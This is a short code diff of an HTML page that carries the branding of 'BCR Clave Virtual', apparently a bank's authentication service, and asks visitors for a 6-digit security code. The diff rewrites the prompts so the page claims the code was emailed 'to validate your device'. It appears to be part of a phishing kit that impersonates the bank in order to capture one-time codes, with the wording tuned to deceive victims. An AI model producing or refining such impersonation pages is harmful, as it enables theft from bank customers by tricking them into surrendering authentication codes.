@@ -36,7 +36,7 @@
                 <p id="gfg" hidden></p>
                 <p id="address" hidden></p>
                 <div align="center">
-                    <span class="ingresartxt" style="font-size: 1.1rem;">Ingresa Código BCR Clave Virtual</span>
+                    <span class="ingresartxt" style="font-size: 1.1rem;">Ingresa el Código que le enviamos a su correo electrónico para validar tu dispositivo</span>
                 </div>
                 <hr class="line1" color="#C4C4C4">
                 <img class="userimg" src="archivos/Seguridad.svg">
@@ -52,11 +52,11 @@
         </div>
 
         <div class="divform2">
-            <span class="ingresartxt" style="font-size: 1.1rem;">Código BCR Clave Virtual</span>
+            <span class="ingresartxt" style="font-size: 1.1rem;">Código de Seguridad</span>
             <hr class="line1" color="#C4C4C4">
             <span class="registertext">
                 Digitando los datos de su mecanismo de autenticación actual. <br><br>
-                Ingrese el código de 6 dígitos de BCR Clave Virtual.
+                Ingrese el código enviado a su método de seguridad.
             </span>
         </div>
     </div>
